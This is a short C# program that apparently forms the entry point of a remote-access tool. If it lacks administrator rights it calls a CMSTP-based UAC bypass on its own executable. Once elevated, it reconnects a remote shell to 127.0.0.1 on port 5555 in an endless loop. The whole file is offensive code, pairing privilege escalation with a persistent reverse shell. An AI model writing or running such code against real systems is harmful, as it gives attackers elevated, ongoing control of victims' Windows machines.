using System.Reflection;
using System.Security.Principal;
using RemoteShellClient;

Console.WriteLine(Assembly.GetExecutingAssembly().Location);

var identity  = WindowsIdentity.GetCurrent();
var principal = new WindowsPrincipal(identity);
if (!principal.IsInRole(WindowsBuiltInRole.Administrator))
{
    Console.WriteLine(Assembly.GetExecutingAssembly().Location);
    CMSTPBypass.Execute(Assembly.GetExecutingAssembly().Location);
    Environment.Exit(1);
}

while (true)
{
    await new RemoteShell().Connect("127.0.0.1", 5555);
}
